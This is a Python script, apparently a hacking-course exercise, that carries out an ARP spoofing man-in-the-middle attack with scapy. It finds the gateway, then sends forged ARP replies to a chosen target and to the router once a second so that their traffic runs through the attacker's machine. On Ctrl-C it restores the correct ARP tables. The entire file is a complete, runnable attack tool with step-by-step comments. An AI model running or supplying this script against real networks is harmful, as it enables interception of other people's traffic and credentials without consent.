# !/usr/bin/env python

import re
import time
import argparse
import subprocess
import scapy.all as scapy

def get_gateway():
    result = subprocess.check_output(["ip", "r"]) #run the command "ip r" in terminal and store the result in the result variable
    gateway_result = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", str(result)) #search for the IP type digits in the result and store it in variable
    return gateway_result.group(0) # return if any caught the above search values

def get_arguments():
    parser = argparse.ArgumentParser() #create an instance of the argparse 
    #include an target IP address option as an argument
    parser.add_argument("-t", "--target", dest="Target", help="Target system IP address")
    #include gateway IP option as the argument
    parser.add_argument("-g", "--gateway", dest="Gateway", help="Gateway IP address of the network")
    #capture the input values for these arguments in options variable
    options = parser.parse_args()
    #if Target IP address is not mentioned then we throw the error and stop running the program
    if not options.Target:
        parser.error("[-] Please enter the correct target IP address")
    #gateway address is same for all the systems in the same network hence can be found by using the terminal commands...
    # if mentioned then we consider that as the gateway IP, else we do run this if condition section to get the gateway IP
    if not options.Gateway:
        #we can find the default gateway IP address of the local network without user input
        ip = get_gateway()
        print(f"[-] No gateway IP mentioned, using the default gateway {ip}")
        options.Gateway = ip
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #creating an arp_request packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # creating a broadcast packet
    arp_request_packet = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0] #sending packet to all systems in that network to get response from target IP
    return answered_list[0][1].hwsrc

def foolYou(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(gateway), psrc=gateway) #creating a response packet with fake information of hwsrc value
    scapy.send(packet, verbose=False) # sending the packet to the target IP

def saveYou(target, gateway):
    # sending the response packet with correct information of all parameters
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(gateway), psrc=gateway, hwsrc=get_mac(gateway))
    scapy.send(packet, verbose=False, count=10) #sending this packet to the target IP

user_input = get_arguments()
try:
    packets_sent = 0
    print(f"[+] Target IP address: {user_input.Target}")
    print(f"[+] Gateway IP address: {user_input.Gateway}")
    while True: #keep sending these packets untill exceptions is captured
        foolYou(user_input.Target, user_input.Gateway) # fooling the target system
        foolYou(user_input.Gateway, user_input.Target) # fooling the router
        packets_sent += 2
        print(f"\r[+] Packets sent: {packets_sent}", end="") #dynamic printing of number of packets sent
        time.sleep(1) #sleep the program execution for a second

except KeyboardInterrupt:
    print("\n[-] Keyboard Interruption detected...quitting the program")
    print("[-] Restoring the arp table values in target system")
    saveYou(user_input.Target, user_input.Gateway) # sending the actual response to target
    saveYou(user_input.Gateway, user_input.Target) # sending the actual response to gateway